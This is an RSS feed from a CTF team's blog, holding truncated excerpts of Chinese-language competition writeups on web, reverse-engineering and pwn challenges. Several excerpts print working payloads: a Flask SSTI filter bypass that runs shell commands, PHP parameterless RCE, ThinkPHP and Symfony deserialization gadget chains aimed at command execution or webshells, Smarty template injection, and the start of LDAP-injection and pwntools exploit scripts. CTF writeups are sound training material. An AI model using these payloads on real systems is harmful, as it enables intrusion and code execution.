<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on or4nge</title>
    <link>https://or4ngesec.github.io/post/</link>
    <description>Recent content in Posts on or4nge</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 13 Jan 2022 13:23:41 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>长安战“疫” Writeup</title>
      <link>https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/</link>
      <pubDate>Thu, 13 Jan 2022 13:23:41 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/</guid>
      <description>Web RCE_No_Para 无参数RCE，且过滤了部分函数。
最终payload：
?a=cat flag.php;&amp;amp;code=system(current(current(get_defined_vars()))); flask 查看网页源码
&amp;lt;!--if not request.full_path.endswith(&amp;quot;.js?&amp;quot;): if not request.full_path.startswith(&amp;quot;/login&amp;quot;): return redirect(&amp;quot;login&amp;quot;)--&amp;gt; 要求路径是以/login开头，以.js?结尾，
查看 flask 文档
Requested path, including the query string.
所以构造路径：
/login/../admin?a=.js? 然后源码提示：
&amp;lt;!--admin/?name=--&amp;gt; 使用以下路径发现是ssti
/login/../admin?name={{7*7}}&amp;amp;a=.js? fuzz发现过滤了__，builtins，所以绕，最终payload
/login/../admin?name={{config|attr(&#39;_&#39;+&#39;_init_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_globals_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_getitem_&#39;+&#39;_&#39;)(&#39;_&#39;+&#39;_buil&#39;+&#39;tins_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_getitem_&#39;+&#39;_&#39;)(&#39;eval&#39;)(&#39;_&#39;+&#39;_import_&#39;+&#39;_(&amp;quot;os&amp;quot;).popen(&amp;quot;cat /flag&amp;quot;).read()&#39;)}}&amp;amp;a=.js? tp 变量覆盖+phar反序列化+thinkphp 5.0.24反序列化写webshell
生成phar文件
&amp;lt;?php namespace think\process\pipes; class Windows { private $files = []; public function __construct() { $this-&amp;gt;files = [new \think\model\Merge]; } } namespace think\model; use think\Model; class Merge extends Model { protected $append = []; protected $error; public function __construct() { $this-&amp;gt;append = [ &amp;#39;bb&amp;#39; =&amp;gt; &amp;#39;getError&amp;#39; ]; $this-&amp;gt;error = (new \think\model\relation\BelongsTo); } } namespace think; class Model{} namespace think\console; class Output { protected $styles = []; private $handle = null; public function __construct() { $this-&amp;gt;styles = [&amp;#39;removeWhereField&amp;#39;]; $this-&amp;gt;handle = (new \think\session\driver\Memcache); } } namespace think\model\relation; class BelongsTo { protected $query; public function __construct() { $this-&amp;gt;query = (new \think\console\Output); } } namespace think\session\driver; class Memcache { protected $handler = null; public function __construct() { $this-&amp;gt;handler = (new \think\cache\driver\Memcached); } } namespace think\cache\driver; class File { protected $tag; protected $options = []; public function __construct() { $this-&amp;gt;tag = false; $this-&amp;gt;options = [ &amp;#39;expire&amp;#39; =&amp;gt; 3600, &amp;#39;cache_subdir&amp;#39; =&amp;gt; false, &amp;#39;prefix&amp;#39; =&amp;gt; &amp;#39;&amp;#39;, &amp;#39;data_compress&amp;#39; =&amp;gt; false, &amp;#39;path&amp;#39; =&amp;gt; &amp;#39;php://filter/convert.</description>
    </item>
    
    <item>
      <title>SCTF2021 Writeup by or4nge</title>
      <link>https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/</link>
      <pubDate>Tue, 28 Dec 2021 16:23:17 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/</guid>
      <description>Web loginme 第一步绕过本地验证，x-forwarded-for 和 client-ip 被过滤了，X-Real-IP:127.0.0.1 绕过
第二步是 gin 的模板注入，让 id 为一个不存在的值，age 为 {{.Password}} 就可以获得 admin 结构体中的 Password 变量值了。
http://124.71.166.197:18001/admin/index?id=5&amp;amp;age={{.Password}}
Upload_it 可以任意上传 /tmp 目录下文件， 可以直接写进 session 文件。查看 phpinfo 发现 session 的处理器是 php，于是可以把 upload_path|$serialize 写进 /tmp/sess_or4nge，然后改自己的 session_id 为 or4nge，即可触发反序列化。
利用给的 Composer.json：
&amp;#34;symfony/string&amp;#34;: &amp;#34;^5.3&amp;#34;, &amp;#34;opis/closure&amp;#34;: &amp;#34;^3.6&amp;#34; 结合出题人发布的文章 https://www.anquanke.com/post/id/217929#h2-3 找到一条链，其中 lazystring 的任意无参数函数调用接的是闭包函数 __invoke，可以将闭包函数序列化进去。
&amp;lt;?php namespace Symfony\Component\String{ require &amp;#34;path\to\autoload.php&amp;#34;; class LazyString{ private $value; public function __construct() { $func = function(){system(&amp;#34;cat /flag&amp;#34;);}; $d = new \Opis\Closure\SerializableClosure($func); $this-&amp;gt;value = $d; } } class UnicodeString{ protected $string = &amp;#39;&amp;#39;; public function __construct() { $this-&amp;gt;string=new LazyString; } } } namespace { $exp=print(urlencode(serialize(new Symfony\Component\String\UnicodeString()))); } 其实这条链本地没有打通，原因是因为在 UnicodeString.</description>
    </item>
    
    <item>
      <title>KCTF2021 Fall Writeup by or4nge</title>
      <link>https://or4ngesec.github.io/post/kctf2021-fall-writeup-by-or4nge/</link>
      <pubDate>Thu, 23 Dec 2021 22:23:17 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/kctf2021-fall-writeup-by-or4nge/</guid>
      <description>转载自战队成员博客: https://s0uthwood.github.io/post/two-challenges-in-kctf2021-fall/
第一题 签到 这题还是比较容易的，需要一点点动调的经验
上张队友的截图吧，懒得自己截了

动调看看内存就知道，流程是：
serial-&amp;gt;十进制-&amp;gt;与name的crc异或-&amp;gt;计算crc
最后需要是一个固定的值，于是只需要想办法反解就行了
这里注意到了一个事情，那就是图中看似是对 v6 的 crc 结果做了约束，其实是对 v6 本身进行了约束
由于题目给了一个实例的 name 和 serial，我们只需要动调拿到这个的 v6，就知道能通过验证的 v6 是多少了
接下来动调拿一下 KCTF 的 crc，这个的结果再异或一下目标的 v6，就得到serial了
 靠记忆写的，希望没错
 第二题 迷失丛林  这题就直接放提交的wp了
 很容易定位到程序的输入

输入长度为32，需要通过 sub_4014A0, sub_401580 的验证
4014A0 较为简单，是个经典的hexstr转成char存到 4041F0 这个地址，最后的16是计算转换后的长度，所以输入就是 [0-9A-F]{32}
随后将输入的前八字节存入 404000 中，剩下的部分传参进 sub_401580
要想让该函数返回1，需要先通过如下的if验证

简单看一下使用的变量，应该是对前八字节的输入进行的验证

结合动调发现大概就是根据404000数组，构成一个 &amp;lt;value, index&amp;gt; 的结构，两两存放到404420当中
分析了一下404000数组的作用和特征，发现这个数组应该是构成一个环状的结构（以当前数值作为索引寻找下一个数），猜测不能有重复的数字，否则可能会构成小循环之类的，用脚本验证了一下发现后面248个数字果然没有重复，于是将前八字节的取值可能锁定到了 0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb 中，总共有 $8!</description>
    </item>
    
    <item>
      <title>2021暗泉杯 Writeup</title>
      <link>https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/</link>
      <pubDate>Mon, 06 Dec 2021 19:23:41 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/</guid>
      <description>* 开头题目表示赛后补题
Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
[萌]odd_upload 题目描述：目录结构与官方项目example相同
所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system(&#39;cat /flag&#39;)}，之后再重新访问题目链接就能获取flag。

flag{1ae85554-c785-4321-8d77-0f68974929f8}
easyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示
The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_
说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？
按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&#39;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
import requests url = &amp;#34;http://47.</description>
    </item>
    
    <item>
      <title>2021蓝帽杯决赛 Writeup</title>
      <link>https://or4ngesec.github.io/post/bluehat-final-writeup/</link>
      <pubDate>Fri, 05 Nov 2021 16:23:41 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/bluehat-final-writeup/</guid>
      <description>Misc 溯源取证——张三的电脑 下载得到压缩包，经过判断类型后得知是 VMDK 文件，用 vmware 挂载。其中得到了 zhangsan.001 和 zhangsan.ad1.txt 两个文件
winhex挂载 zhangsan.001，在分区1的 $RECYCLE.BIN 中找到 tips.txt.txt 文件，内容为
In order to prevent leaving evidence, Zhang San deleted all the key evidence photos. 因此寻找 png 文件，同样在分区1的 $RECYCLE.BIN 中找到了包含相应的 flag 图片 $REFK9A1.png
Pwn secretcode 掏出初赛的代码稍微改改
from pwn import * import sys # context.log_level = &amp;#34;debug&amp;#34; context.arch = &amp;#39;amd64&amp;#39; if len(sys.argv) &amp;lt; 2: debug = True else: debug = False ru = lambda x : p.</description>
    </item>
    
  </channel>
</rss>
